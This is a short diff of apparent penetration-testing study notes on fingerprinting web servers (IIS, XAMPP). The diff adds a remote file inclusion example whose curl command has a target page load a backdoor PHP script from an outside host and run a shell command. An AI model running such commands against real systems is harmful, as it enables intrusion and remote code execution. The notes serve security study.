@@ -45,4 +45,6 @@ To automate the process, use the following tools
 - windows --> IIS 
      - example.com/index.aspx?id=1
 - xampp may run .apache .php .mysql --> so you can't guarantee that the running machine is Windows
+- RFI using simple-backdoor.php
+-     curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&cmd=ls"
 
